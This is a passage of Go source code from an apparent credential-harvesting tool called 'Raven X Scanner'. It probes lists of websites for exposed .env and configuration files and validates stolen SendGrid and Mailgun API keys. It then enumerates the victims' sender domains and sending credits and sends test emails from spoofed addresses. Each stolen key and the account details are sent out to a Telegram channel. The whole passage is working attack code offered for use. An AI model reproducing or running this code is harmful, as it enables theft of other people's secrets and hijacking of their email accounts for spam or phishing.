	if err == nil && respCredits.StatusCode == 200 {
		defer respCredits.Body.Close()
		body, _ := ioutil.ReadAll(respCredits.Body)
		json.Unmarshal(body, &credits)
	}

	reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/senders", nil)
	reqSenders.Header.Set("Authorization", "Bearer "+apiKey)
	respSenders, err := client.Do(reqSenders)
	if err == nil && respSenders.StatusCode == 200 {
		defer respSenders.Body.Close()
		body, _ := ioutil.ReadAll(respSenders.Body)
		json.Unmarshal(body, &senders)
	}

	authDomainsText := ""
	for _, d := range domains.Result {
		authDomainsText += fmt.Sprintf("  - Domain: %s\n", d.Domain)
	}

	sendersText := ""
	for _, s := range senders {
		sendersText += fmt.Sprintf("%s\n", s.From.Email)
	}

	msg := fmt.Sprintf(
		"✅ API Key: %s\n\n"+
			"🌐 Authenticated Domains:\n%s\n"+
			"📊 Sending Credits:\nTotal: %d emails, Remaining: %d\n\n"+
			"📧 From Emails:\n%s",
		apiKey, authDomainsText, credits.Total, credits.Remaining, sendersText,
	)
	go a.sendTelegram(msg)

	if a.Config.SMTPTestEmail != "" {
		testFrom := fmt.Sprintf("%s@%s", randomString(8), "spoof.test")
		mailData := map[string]interface{}{
			"personalizations": []map[string]interface{}{
				{
					"to": []map[string]string{
						{"email": a.Config.SMTPTestEmail},
					},
					"subject": "SendGrid Test Email",
				},
			},
			"from": map[string]string{"email": testFrom},
			"content": []map[string]string{
				{"type": "text/plain", "value": "This is a spoof test email from Raven X Scanner"},
			},
		}
		jsonData, _ := json.Marshal(mailData)

		reqSend, _ := http.NewRequest("POST", "https://api.sendgrid.com/v3/mail/send", strings.NewReader(string(jsonData)))
		reqSend.Header.Set("Authorization", "Bearer "+apiKey)
		reqSend.Header.Set("Content-Type", "application/json")
		respSend, err := client.Do(reqSend)
		if err == nil && (respSend.StatusCode == 202 || respSend.StatusCode == 200) {
			msgSpoof := fmt.Sprintf(
				"✅ API Key: %s\n\n"+
					"🌐 Authenticated Domains:\nSpoof\n\n"+
					"📊 Sending Credits:\nSpoof\n\n"+
					"📧 From Emails:\nSpoof",
				apiKey,
			)
			go a.sendTelegram(msgSpoof)
		}
	}
}

func (a *AWSScanner) checkMailgunKey(apiKey, sourceURL string) {
	regions := map[string]string{
		"EU": "https://api.eu.mailgun.net/v3",
		"US": "https://api.mailgun.net/v3",
	}

	report := fmt.Sprintf("Key 1: %s\n", apiKey)

	for regionName, baseURL := range regions {
		client := &http.Client{Timeout: 15 * time.Second}

		req, _ := http.NewRequest("GET", baseURL+"/domains", nil)
		req.SetBasicAuth("api", apiKey)
		resp, err := client.Do(req)

		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			report += fmt.Sprintf("❌ Mailgun %s API Invalid!\n\n", regionName)
			continue
		}

		var domainsResp struct {
			Items []struct {
				Name  string `json:"name"`
				Type  string `json:"type"`
				State string `json:"state"`
			} `json:"items"`
		}
		body, _ := ioutil.ReadAll(resp.Body)
		json.Unmarshal(body, &domainsResp)

		if len(domainsResp.Items) == 0 {
			report += fmt.Sprintf("⚠️ Mailgun %s API Valid but No Domains Found\n\n", regionName)
			continue
		}

		report += fmt.Sprintf("🇪🇺 ", regionName)
		if regionName == "US" {
			report = strings.Replace(report, "🇪🇺 ", "🇺🇸 ", 1)
		}
		report += fmt.Sprintf("Mailgun %s API Detected!\n\n", regionName)
		report += fmt.Sprintf("✅ API Key Valid for %s region.\n\n", regionName)

		report += "🏢 Sender Domains:\n"
		for _, d := range domainsResp.Items {
			report += fmt.Sprintf("• %s\n", d.Name)
		}
		report += "\n📬 Email Sending Results:\n"

		for _, d := range domainsResp.Items {
			if strings.HasPrefix(d.Name, "sandbox") {
				report += fmt.Sprintf("⚠️ %s — This is a Free Account (sandbox-only domain)\n\n", d.Name)
				continue
			}

			if a.Config.SMTPTestEmail != "" {
				form := url.Values{}
				form.Set("from", fmt.Sprintf("Test <%s@%s>", randomString(6), d.Name))
				form.Set("to", a.Config.SMTPTestEmail)
				form.Set("subject", "Mailgun API Test Email")
				form.Set("text", "This is a test email sent by Raven X Scanner to verify Mailgun credentials.")

				sendReq, _ := http.NewRequest("POST", baseURL+"/"+d.Name+"/messages", strings.NewReader(form.Encode()))
				sendReq.SetBasicAuth("api", apiKey)
				sendReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				sendResp, err := client.Do(sendReq)

				if err != nil {
					report += fmt.Sprintf("❌ %s — Email Sending Failed\nReason:\n%v\n\n", d.Name, err)
					continue
				}
				defer sendResp.Body.Close()

				if sendResp.StatusCode == 200 {
					report += fmt.Sprintf("✅ %s — Email Sent Successfully\n\n", d.Name)
				} else {
					errBody, _ := ioutil.ReadAll(sendResp.Body)
					report += fmt.Sprintf("❌ %s — Email Sending Failed\nReason:\n%s\n\n", d.Name, string(errBody))
				}
			}
		}
	}

	go a.sendTelegram(report)
}

func run() {
	fmt.Printf("%s[*]%s RAVEN X SCANNER BY @JIMMYBOGARTZ\n", CYAN, RESET)
	fmt.Printf("%s[*]%s AWS/GitHub/Mailgun Scanner Starting...\n", CYAN, RESET)
	if len(os.Args) < 2 {
		fmt.Printf("%s[X]%s Usage: go run main.go <url_list_file>\n", RED, RESET)
		os.Exit(1)
	}
	configFile := defaultConfigPath
	listFile := os.Args[1]

	scanner := NewAWSScanner(configFile)

	urls := []string{}
	file, err := os.Open(listFile)
	if err != nil {
		os.Exit(1)
	}
	defer file.Close()
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			urls = append(urls, line)
		}
	}
	if len(urls) == 0 {
		os.Exit(1)
	}
	scanner.run(urls)
}

func main() {
	run()
}

func loadEnvPaths() []string {
	return []string{
		"/.env",
		"/public/.env",
		"/laravel/.env",
		"/laravel/core/.env",
		"/beta/.env",
		"/kyc/.env",
		"/admin/.env",
		"/prod/.env",
		"/api/.env",
		"/.docker/laravel/app/.env",
		"/.docker/.env",
		"/.gitlab-ci/.env",
		"/.vscode/.env",
		"/web/.env",
		"/app/.env",
		"/crm/.env",
		"/backend/.env",
		"/local/.env",
		"/application/.env",
		"/.env",
		"/live_env",
		"/admin-app/.env",
		"/mailer/.env",
		"/shared/.env",
		"/.env.project",
		"/apps/.env",
		"/development/.env",
		"/.env.bak",
		"/.env.config",
		"/.env-example",
		"/.env-sample",
		"/.env.backup",
		"/.env.dev",
		"/.env.dev.local",
		"/.env.development.local",
		"/.env.development.sample",
		"/.env.dist",
		"/.env.docker",
		"/.env.docker.dev",
		"/.env.example",
		"/.env.local",
		"/.env.prod",
		"/.env.prod.local",
		"/.env.production",
		"/.env.production.local",
		"/.env.sample",
		"/.env.save",
		"/.env.stage",
		"/.env.travis",
		"/.envrc",
		"/.envs",
		"/.env~",
		"/login?pp=enable&pp=env",
		"/?pp=enable&pp=env",
		"/?pp=env&pp=env",
		"/config/env.php",
		"/app/etc/env.local.php",
		"/.env.php",
		"/app/etc/env.php",
		"/env.json",
		"/config/env.json",
		"/src/config/environment.json",
		"/config/environment.json",
		"/private/env.json",
	}
}

